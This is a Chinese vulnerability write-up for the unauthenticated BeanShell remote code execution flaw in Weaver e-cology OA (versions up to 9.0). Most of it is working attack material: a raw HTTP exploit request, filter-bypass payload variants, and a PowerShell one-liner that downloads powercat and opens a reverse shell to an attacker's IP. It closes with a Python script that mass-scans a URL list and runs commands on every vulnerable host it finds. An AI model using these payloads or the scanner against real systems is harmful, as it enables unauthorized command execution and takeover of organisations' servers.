<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>泛微OA E-cology远程代码执行漏洞</h1><h2>一、漏洞简介</h2><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p><h2>二、漏洞影响</h2><p>e-cology &lt;=9.0</p><h2>三、复现过程</h2><h3>漏洞指纹</h3><p>Set-Cookie: ecology_JSessionId=</p><p>ecology</p><p>/weaver/bsh.servlet.BshServlet</p><h3>漏洞复现</h3><p>POST /weaver/bsh.servlet.BshServlet HTTP/1.1<br />Host: www.0-sec.org:8088<br />Accept: */*<br />Accept-Language: en<br />User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br />Connection: close<br />Content-Length: 98<br />Content-Type: application/x-www-form-urlencoded<br /><br />bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</p><p><em><strong>利用技巧</strong></em></p><ul><li>1.其他形式绕过<br />eval%00("ex"%2b"ec(\"whoami\")"); 也可以换成 ex\u0065c("cmd /c dir");</li><li>2.泛微多数都是windows环境, 反弹shell可以使用pcat</li></ul><p>powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd</p><h3>poc</h3><p>useage</p><p>#1.install python Dependencies Library <br />pip install requests<br /><br />#2.批量脚本 执行 <br />python Weaver-Ecology-OA_RCE-exp.py <br /><br /><br />url.txt文件中 是url地址 需要带http协议</p><p>#/usr/bin/python<br />#coding:utf-8<br />#Author:Ja0k<br />#For Weaver-Ecology-OA_RCE<br /><br />import urllib3<br />urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br /><br />import requests,sys<br /><br />headers = {<br />    'Content-Type': 'text/xml; charset=utf-8',<br />    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',<br />    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',<br />    'Cache-Control': 'max-age=0',<br />    'Content-Type': 'application/x-www-form-urlencoded',<br />    'Upgrade-Insecure-Requests': '1',<br />    'Content-Length': '578'<br />}<br /><br />proxies= {'http':'http://127.0.0.1:8080'}<br />            <br />def Poc_check(target):<br /><br />    Url_Payload1="/bsh.servlet.BshServlet"<br />    Url_Payload2="/weaver/bsh.servlet.BshServlet"<br />    Url_Payload3="/weaveroa/bsh.servlet.BshServlet"<br />    Url_Payload4="/oa/bsh.servlet.BshServlet"<br />    <br />    Data_Payload1="""bsh.script=exec("whoami");&amp;bsh.servlet.output=raw"""<br />    Data_Payload2= """bsh.script=\u0065\u0078\u0065\u0063("whoami");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw"""<br />    Data_Payload3= """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&amp;command=whoami"""<br />    for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4):<br />        url= target + Url_Payload<br />        for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): <br />            try:<br />                http_response = requests.post(url,data=Data_payload,headers=headers,verify=False)<br />                #print http_response.status_code<br />                if http_response.status_code == 200:<br />                    if ";&lt;/script&gt;" not in (http_response.content):<br />                        if "Login.jsp" not in (http_response.content):<br />                            if "Error" not in (http_response.content):<br />                                print "{0} is a E-cologyOA_RCE Vulnerability".format(url)<br />                                print "Server Current Username：{0}".format(http_response.content)<br />                elif http_response.status_code == 500:<br />                    print "{0}500 maybe is Weaver-EcologyOA，Please confirm by yourself ".format(url)<br />                else:<br />                    pass              <br />            except Exception,Error:<br />                pass    <br />    <br />if __name__ == '__main__':<br />    for line in open(sys.argv[1]).readlines():<br />        target=line.strip()<br />        Poc_check(target)</p></body></html>